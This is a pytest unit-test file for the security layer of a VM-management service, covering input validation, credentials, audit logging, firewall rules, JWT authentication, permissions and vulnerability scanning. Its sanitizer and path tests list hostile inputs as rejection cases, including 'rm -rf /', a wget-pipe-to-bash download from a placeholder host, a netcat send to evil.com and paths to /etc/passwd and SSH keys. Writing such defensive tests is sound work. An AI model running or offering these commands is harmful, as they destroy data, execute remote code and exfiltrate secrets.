"""
Unit tests for security components.
"""

import pytest
import asyncio
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, AsyncMock
import base64
import json

from src.utils.security import (
    InputValidator, CredentialManager, SecurityPolicy, SecurityError,
    SecurityEnforcer, AuditLogger as BaseAuditLogger
)
from src.utils.audit import (
    AuditLogger, AuditEvent, AuditEventType, AuditSeverity,
    ComplianceFramework
)
from src.core.security_manager import (
    SecurityManager, FirewallManager, VMIsolationManager, FirewallRule
)
from src.api.middleware.auth import (
    AuthenticationManager, AuthorizationManager, AuthConfig,
    TokenData, UserInfo
)
from src.utils.security_scanner import (
    VulnerabilityScanner, NetworkScanner, SecurityVulnerability, SecurityScanResult
)


class TestInputValidator:
    """Test input validation functionality."""
    
    def test_validate_vm_name_valid(self):
        """Test valid VM name validation."""
        valid_names = ["test-vm", "vm_123", "TestVM1", "a"]
        for name in valid_names:
            result = InputValidator.validate_vm_name(name)
            assert result == name
    
    def test_validate_vm_name_invalid(self):
        """Test invalid VM name validation."""
        invalid_names = [
            "",  # Empty
            "a" * 33,  # Too long
            "-invalid",  # Starts with hyphen
            "invalid!",  # Special character
            "123 space"  # Contains space
        ]
        
        for name in invalid_names:
            with pytest.raises(SecurityError):
                InputValidator.validate_vm_name(name)
    
    def test_validate_snapshot_name_valid(self):
        """Test valid snapshot name validation."""
        valid_names = ["snap-1", "snapshot_123", "test.snap", "a"]
        for name in valid_names:
            result = InputValidator.validate_snapshot_name(name)
            assert result == name
    
    def test_validate_ip_address_valid(self):
        """Test valid IP address validation."""
        valid_ips = ["192.168.1.1", "127.0.0.1", "10.0.0.1", "172.16.0.1"]
        for ip in valid_ips:
            result = InputValidator.validate_ip_address(ip)
            assert result == ip
    
    def test_validate_ip_address_invalid(self):
        """Test invalid IP address validation."""
        invalid_ips = ["256.1.1.1", "not.an.ip", "192.168.1", ""]
        
        for ip in invalid_ips:
            with pytest.raises(SecurityError):
                InputValidator.validate_ip_address(ip)
    
    def test_validate_port_valid(self):
        """Test valid port validation."""
        valid_ports = [1, 80, 443, 8080, 65535]
        for port in valid_ports:
            result = InputValidator.validate_port(port)
            assert result == port
    
    def test_validate_port_invalid(self):
        """Test invalid port validation."""
        invalid_ports = [0, -1, 65536, "not_a_port", None]
        
        for port in invalid_ports:
            with pytest.raises(SecurityError):
                InputValidator.validate_port(port)
    
    def test_sanitize_command_valid(self):
        """Test command sanitization with valid commands."""
        valid_commands = [
            "ls -la",
            "cat file.txt",
            "echo hello",
            "ps aux"
        ]
        
        for cmd in valid_commands:
            result = InputValidator.sanitize_command(cmd)
            assert result == cmd
    
    def test_sanitize_command_dangerous(self):
        """Test command sanitization with dangerous commands."""
        dangerous_commands = [
            "rm -rf /",
            "format c:",
            "shutdown now",
            "wget malicious.com/script | bash",
            "echo 'test' | nc evil.com 1337"
        ]
        
        for cmd in dangerous_commands:
            with pytest.raises(SecurityError):
                InputValidator.sanitize_command(cmd)
    
    def test_validate_path_valid(self):
        """Test path validation with valid paths."""
        valid_paths = ["file.txt", "dir/file.txt", "test-file_123.log"]
        
        for path in valid_paths:
            result = InputValidator.validate_path(path)
            assert result == path
    
    def test_validate_path_traversal(self):
        """Test path validation prevents path traversal."""
        traversal_paths = ["../etc/passwd", "dir/../../secret", "~/.ssh/id_rsa"]
        
        for path in traversal_paths:
            with pytest.raises(SecurityError):
                InputValidator.validate_path(path)
    
    def test_validate_resource_limits_valid(self):
        """Test resource limits validation."""
        vcpus, memory = InputValidator.validate_resource_limits(4, 2048)
        assert vcpus == 4
        assert memory == 2048
    
    def test_validate_resource_limits_invalid(self):
        """Test resource limits validation with invalid values."""
        with pytest.raises(SecurityError):
            InputValidator.validate_resource_limits(0, 2048)  # Invalid vCPUs
        
        with pytest.raises(SecurityError):
            InputValidator.validate_resource_limits(4, 32)  # Memory too low
        
        with pytest.raises(SecurityError):
            InputValidator.validate_resource_limits(64, 2048)  # Too many vCPUs


class TestCredentialManager:
    """Test credential management functionality."""
    
    def test_generate_master_key(self):
        """Test master key generation."""
        key = CredentialManager.generate_master_key()
        assert isinstance(key, bytes)
        assert len(key) > 0
    
    def test_generate_api_key(self):
        """Test API key generation."""
        key = CredentialManager.generate_api_key()
        assert isinstance(key, str)
        assert len(key) > 20
    
    def test_generate_session_token(self):
        """Test session token generation."""
        token = CredentialManager.generate_session_token()
        assert isinstance(token, str)
        assert len(token) > 20
    
    def test_hash_password(self):
        """Test password hashing."""
        password = "test_password123!"
        hash_str, salt = CredentialManager.hash_password(password)
        
        assert isinstance(hash_str, str)
        assert isinstance(salt, bytes)
        assert len(hash_str) > 0
        assert len(salt) > 0
    
    def test_verify_password(self):
        """Test password verification."""
        password = "test_password123!"
        hash_str, salt = CredentialManager.hash_password(password)
        
        # Correct password should verify
        assert CredentialManager.verify_password(password, hash_str, salt)
        
        # Wrong password should not verify
        assert not CredentialManager.verify_password("wrong_password", hash_str, salt)
    
    def test_encrypt_decrypt_credential(self):
        """Test credential encryption and decryption."""
        master_key = CredentialManager.generate_master_key()
        manager = CredentialManager(master_key)
        
        credential = "secret_api_key_12345"
        encrypted = manager.encrypt_credential(credential)
        decrypted = manager.decrypt_credential(encrypted)
        
        assert encrypted != credential
        assert decrypted == credential


class TestSecurityPolicy:
    """Test security policy enforcement."""
    
    def test_policy_initialization(self):
        """Test security policy initialization."""
        config = {
            'max_concurrent_vms': 10,
            'max_vm_memory_mb': 4096,
            'max_vm_vcpus': 4,
            'require_authentication': True
        }
        
        policy = SecurityPolicy(config)
        assert policy.max_concurrent_vms == 10
        assert policy.max_vm_memory == 4096
        assert policy.max_vm_vcpus == 4
        assert policy.require_authentication is True
    
    def test_validate_vm_creation_valid(self):
        """Test VM creation validation with valid config."""
        config = {'max_vm_memory_mb': 4096, 'max_vm_vcpus': 4}
        policy = SecurityPolicy(config)
        
        vm_config = {'vcpus': 2, 'memory_mb': 2048}
        result = policy.validate_vm_creation(vm_config, "test_user")
        assert result is True
    
    def test_validate_vm_creation_exceeds_limits(self):
        """Test VM creation validation with config exceeding limits."""
        config = {'max_vm_memory_mb': 4096, 'max_vm_vcpus': 4}
        policy = SecurityPolicy(config)
        
        # Test vCPU limit
        with pytest.raises(SecurityError):
            policy.validate_vm_creation({'vcpus': 8, 'memory_mb': 2048}, "test_user")
        
        # Test memory limit
        with pytest.raises(SecurityError):
            policy.validate_vm_creation({'vcpus': 2, 'memory_mb': 8192}, "test_user")
    
    def test_validate_command_execution(self):
        """Test command execution validation."""
        config = {'blocked_commands': ['rm -rf', 'format']}
        policy = SecurityPolicy(config)
        
        # Valid command
        assert policy.validate_command_execution("ls -la", "test_user") is True
        
        # Blocked command
        with pytest.raises(SecurityError):
            policy.validate_command_execution("rm -rf /tmp/*", "test_user")


class TestAuditLogger:
    """Test audit logging functionality."""
    
    @pytest.fixture
    def audit_config(self):
        """Audit logger configuration."""
        return {
            'audit_log_file': '/tmp/test_audit.log',
            'retention_days': 30,
            'enable_encryption': False,
            'compliance_frameworks': ['soc2'],
            'buffer_size': 10,
            'flush_interval_seconds': 1
        }
    
    @pytest.fixture
    def audit_logger(self, audit_config):
        """Create audit logger instance."""
        return AuditLogger(audit_config)
    
    @pytest.mark.asyncio
    async def test_log_authentication_event(self, audit_logger):
        """Test authentication event logging."""
        await audit_logger.log_authentication(
            user_id="test_user",
            success=True,
            source_ip="192.168.1.100"
        )
        
        # Check that event was buffered
        assert len(audit_logger.event_buffer) == 1
        event = audit_logger.event_buffer[0]
        assert event.event_type == AuditEventType.AUTHENTICATION
        assert event.user_id == "test_user"
        assert event.outcome == "SUCCESS"
    
    @pytest.mark.asyncio
    async def test_log_vm_operation_event(self, audit_logger):
        """Test VM operation event logging."""
        await audit_logger.log_vm_operation(
            user_id="test_user",
            vm_name="test-vm",
            action="create",
            success=True,
            source_ip="192.168.1.100"
        )
        
        assert len(audit_logger.event_buffer) == 1
        event = audit_logger.event_buffer[0]
        assert event.event_type == AuditEventType.VM_OPERATION
        assert event.resource_id == "test-vm"
        assert event.action == "CREATE"
    
    @pytest.mark.asyncio
    async def test_log_security_violation(self, audit_logger):
        """Test security violation logging."""
        await audit_logger.log_security_violation(
            user_id="test_user",
            violation_type="UNAUTHORIZED_ACCESS",
            details="Attempted to access restricted resource",
            source_ip="192.168.1.100"
        )
        
        assert len(audit_logger.event_buffer) == 1
        event = audit_logger.event_buffer[0]
        assert event.event_type == AuditEventType.SECURITY_VIOLATION
        assert event.severity == AuditSeverity.CRITICAL
    
    def test_audit_event_validation(self, audit_logger):
        """Test audit event validation."""
        # Valid event
        event = AuditEvent(
            event_id="test_123",
            timestamp=datetime.utcnow(),
            event_type=AuditEventType.AUTHENTICATION,
            severity=AuditSeverity.MEDIUM,
            user_id="test_user",
            source_ip="192.168.1.1",
            action="LOGIN",
            resource_type="auth",
            resource_id="auth_system",
            outcome="SUCCESS",
            details={}
        )
        
        audit_logger._validate_event(event)  # Should not raise
        
        # Invalid event (missing event_id)
        invalid_event = AuditEvent(
            event_id="",
            timestamp=datetime.utcnow(),
            event_type=AuditEventType.AUTHENTICATION,
            severity=AuditSeverity.MEDIUM,
            user_id="test_user",
            source_ip="192.168.1.1",
            action="LOGIN",
            resource_type="auth",
            resource_id="auth_system",
            outcome="SUCCESS",
            details={}
        )
        
        with pytest.raises(SecurityError):
            audit_logger._validate_event(invalid_event)


class TestFirewallManager:
    """Test firewall management functionality."""
    
    @pytest.fixture
    def firewall_config(self):
        """Firewall configuration."""
        return {
            'bridge_name': 'test-br0',
            'vm_network': '192.168.100.0/24',
            'host_ip': '192.168.100.1'
        }
    
    @pytest.fixture
    def firewall_manager(self, firewall_config):
        """Create firewall manager instance."""
        return FirewallManager(firewall_config)
    
    @pytest.mark.asyncio
    async def test_firewall_initialization(self, firewall_manager):
        """Test firewall initialization."""
        with patch.object(firewall_manager, '_execute_iptables_command', new=AsyncMock(return_value=True)):
            await firewall_manager.initialize_firewall()
            assert firewall_manager.default_rules_applied is True
    
    @pytest.mark.asyncio
    async def test_create_vm_isolation_rules(self, firewall_manager):
        """Test VM isolation rule creation."""
        with patch.object(firewall_manager, '_execute_iptables_command', new=AsyncMock(return_value=True)):
            result = await firewall_manager.create_vm_isolation_rules(
                vm_name="test-vm",
                vm_ip="192.168.100.10"
            )
            assert result is True
    
    @pytest.mark.asyncio
    async def test_add_port_forwarding_rule(self, firewall_manager):
        """Test port forwarding rule creation."""
        with patch.object(firewall_manager, '_execute_iptables_command', new=AsyncMock(return_value=True)):
            result = await firewall_manager.add_port_forwarding_rule(
                vm_name="test-vm",
                vm_ip="192.168.100.10",
                host_port=8080,
                vm_port=80
            )
            assert result is True
            assert "test-vm" in firewall_manager.vm_rules
    
    @pytest.mark.asyncio
    async def test_remove_vm_rules(self, firewall_manager):
        """Test VM rule removal."""
        # Add some rules first
        firewall_manager.vm_rules["test-vm"] = [
            FirewallRule(
                chain="nat",
                action="DNAT",
                protocol="tcp",
                dest_ip="192.168.100.10",
                dest_port=80
            )
        ]
        
        with patch.object(firewall_manager, '_execute_iptables_command', new=AsyncMock(return_value=True)):
            result = await firewall_manager.remove_vm_rules("test-vm")
            assert result is True
            assert "test-vm" not in firewall_manager.vm_rules


class TestAuthenticationManager:
    """Test authentication manager functionality."""
    
    @pytest.fixture
    def auth_config(self):
        """Authentication configuration."""
        return AuthConfig(
            jwt_secret="test-secret-key",
            token_expire_minutes=60,
            max_failed_attempts=3,
            lockout_duration_minutes=15
        )
    
    @pytest.fixture
    def auth_manager(self, auth_config):
        """Create authentication manager instance."""
        return AuthenticationManager(auth_config)
    
    def test_create_user(self, auth_manager):
        """Test user creation."""
        result = auth_manager.create_user(
            user_id="test_user",
            email="test@example.com",
            password="StrongPassword123!",
            roles=["user"],
            permissions=["vm:read"]
        )
        assert result is True
        assert "test_user" in auth_manager.users
    
    def test_create_user_weak_password(self, auth_manager):
        """Test user creation with weak password."""
        result = auth_manager.create_user(
            user_id="test_user",
            email="test@example.com",
            password="weak",  # Too weak
            roles=["user"]
        )
        assert result is False
    
    def test_authenticate_user_success(self, auth_manager):
        """Test successful user authentication."""
        # Create user first
        auth_manager.create_user(
            user_id="test_user",
            email="test@example.com",
            password="StrongPassword123!",
            roles=["user"]
        )
        
        # Authenticate
        token_data = auth_manager.authenticate_user(
            user_id="test_user",
            password="StrongPassword123!",
            ip_address="192.168.1.100"
        )
        
        assert token_data is not None
        assert token_data.user_id == "test_user"
        assert "user" in token_data.roles
    
    def test_authenticate_user_failure(self, auth_manager):
        """Test failed user authentication."""
        # Create user first
        auth_manager.create_user(
            user_id="test_user",
            email="test@example.com",
            password="StrongPassword123!",
            roles=["user"]
        )
        
        # Wrong password
        with pytest.raises(SecurityError):
            auth_manager.authenticate_user(
                user_id="test_user",
                password="WrongPassword",
                ip_address="192.168.1.100"
            )
    
    def test_jwt_token_creation_and_verification(self, auth_manager):
        """Test JWT token creation and verification."""
        # Create test token data
        token_data = TokenData(
            user_id="test_user",
            email="test@example.com",
            roles=["user"],
            permissions=["vm:read"],
            expires_at=datetime.utcnow() + timedelta(hours=1),
            session_id="test_session_123"
        )
        
        # Store session
        auth_manager.sessions[token_data.session_id] = token_data
        
        # Create JWT
        jwt_token = auth_manager.create_jwt_token(token_data)
        assert isinstance(jwt_token, str)
        assert len(jwt_token) > 0
        
        # Verify JWT
        verified_token_data = auth_manager.verify_jwt_token(jwt_token)
        assert verified_token_data.user_id == "test_user"
        assert verified_token_data.session_id == "test_session_123"


class TestAuthorizationManager:
    """Test authorization manager functionality."""
    
    @pytest.fixture
    def auth_manager(self):
        """Create authorization manager instance."""
        return AuthorizationManager()
    
    def test_check_permission_exact_match(self, auth_manager):
        """Test permission checking with exact match."""
        user_permissions = ["vm:read", "vm:create", "snapshot:read"]
        
        assert auth_manager.check_permission(user_permissions, "vm:read") is True
        assert auth_manager.check_permission(user_permissions, "vm:create") is True
        assert auth_manager.check_permission(user_permissions, "vm:delete") is False
    
    def test_check_permission_wildcard(self, auth_manager):
        """Test permission checking with wildcards."""
        user_permissions = ["vm:*", "snapshot:read"]
        
        assert auth_manager.check_permission(user_permissions, "vm:read") is True
        assert auth_manager.check_permission(user_permissions, "vm:create") is True
        assert auth_manager.check_permission(user_permissions, "vm:delete") is True
        assert auth_manager.check_permission(user_permissions, "snapshot:read") is True
        assert auth_manager.check_permission(user_permissions, "snapshot:create") is False
    
    def test_check_permission_admin_wildcard(self, auth_manager):
        """Test admin wildcard permission."""
        user_permissions = ["*"]
        
        assert auth_manager.check_permission(user_permissions, "vm:read") is True
        assert auth_manager.check_permission(user_permissions, "any:permission") is True
    
    def test_expand_user_permissions(self, auth_manager):
        """Test user permission expansion from roles."""
        user_roles = ["user", "power_user"]
        user_permissions = ["custom:permission"]
        
        expanded = auth_manager.expand_user_permissions(user_roles, user_permissions)
        
        assert "custom:permission" in expanded
        assert "vm:read" in expanded  # From user role
        assert "vm:*" in expanded  # From power_user role


class TestVulnerabilityScanner:
    """Test vulnerability scanner functionality."""
    
    @pytest.fixture
    def scanner_config(self):
        """Scanner configuration."""
        return {
            'scan_timeout_minutes': 5,
            'vulnerability_db_update_hours': 24
        }
    
    @pytest.fixture
    def vulnerability_scanner(self, scanner_config):
        """Create vulnerability scanner instance."""
        return VulnerabilityScanner(scanner_config)
    
    @pytest.mark.asyncio
    async def test_network_scanner_port_check(self):
        """Test network scanner port checking."""
        scanner = NetworkScanner()
        
        # Test localhost port 22 (SSH - likely to be open)
        with patch.object(scanner, '_is_port_open', new=AsyncMock(return_value=True)):
            result = await scanner._is_port_open("127.0.0.1", 22)
            assert result is True
        
        # Test unlikely port
        with patch.object(scanner, '_is_port_open', new=AsyncMock(return_value=False)):
            result = await scanner._is_port_open("127.0.0.1", 12345)
            assert result is False
    
    @pytest.mark.asyncio
    async def test_scan_host(self):
        """Test host scanning."""
        scanner = NetworkScanner()
        
        with patch.object(scanner, '_is_port_open', new=AsyncMock(return_value=True)):
            with patch.object(scanner, '_identify_service', new=AsyncMock(return_value="HTTP")):
                result = await scanner.scan_host("127.0.0.1", [80, 443])
                
                assert result['host'] == "127.0.0.1"
                assert 80 in result['open_ports']
                assert 443 in result['open_ports']
                assert result['services'][80] == "HTTP"
    
    @pytest.mark.asyncio
    async def test_system_scan(self, vulnerability_scanner):
        """Test system vulnerability scan."""
        with patch.object(vulnerability_scanner, '_scan_system_configuration', new=AsyncMock(return_value=[])):
            with patch.object(vulnerability_scanner, '_scan_network_services', new=AsyncMock(return_value=[])):
                with patch.object(vulnerability_scanner, '_scan_file_permissions', new=AsyncMock(return_value=[])):
                    with patch.object(vulnerability_scanner, '_scan_common_vulnerabilities', new=AsyncMock(return_value=[])):
                        
                        result = await vulnerability_scanner.scan_system("test_scan_123")
                        
                        assert result.scan_id == "test_scan_123"
                        assert result.scan_type == "SYSTEM_SCAN"
                        assert result.status == "COMPLETED"
                        assert isinstance(result.vulnerabilities, list)
                        assert isinstance(result.recommendations, list)
    
    @pytest.mark.asyncio
    async def test_vm_scan(self, vulnerability_scanner):
        """Test VM vulnerability scan."""
        mock_network_result = {
            'host': '192.168.100.10',
            'open_ports': [22, 80, 443],
            'services': {22: 'SSH', 80: 'HTTP', 443: 'HTTPS'}
        }
        
        with patch.object(vulnerability_scanner.network_scanner, 'scan_host', new=AsyncMock(return_value=mock_network_result)):
            with patch.object(vulnerability_scanner.network_scanner, 'scan_ssl_certificate', new=AsyncMock(return_value={'issues': []})):
                
                result = await vulnerability_scanner.scan_vm(
                    scan_id="vm_scan_123",
                    vm_name="test-vm",
                    vm_ip="192.168.100.10"
                )
                
                assert result.scan_id == "vm_scan_123"
                assert result.scan_type == "VM_SCAN"
                assert result.target == "test-vm"
                assert result.status == "COMPLETED"


@pytest.mark.asyncio
async def test_security_integration():
    """Integration test for security components."""
    # Test that all components work together
    
    # Initialize components
    security_config = {
        'max_concurrent_vms': 10,
        'require_authentication': True
    }
    
    security_enforcer = SecurityEnforcer(security_config)
    
    # Test input validation
    vm_name = security_enforcer.validate_and_sanitize_input('vm_name', 'test-vm')
    assert vm_name == 'test-vm'
    
    # Test rate limiting
    rate_limit_ok = security_enforcer.check_rate_limit('test_user', 'vm_create', limit=5)
    assert rate_limit_ok is True
    
    # Test multiple operations don't exceed rate limit immediately
    for i in range(4):
        rate_limit_ok = security_enforcer.check_rate_limit('test_user', 'vm_create', limit=5)
        assert rate_limit_ok is True
    
    # 6th operation should fail
    rate_limit_exceeded = security_enforcer.check_rate_limit('test_user', 'vm_create', limit=5)
    assert rate_limit_exceeded is False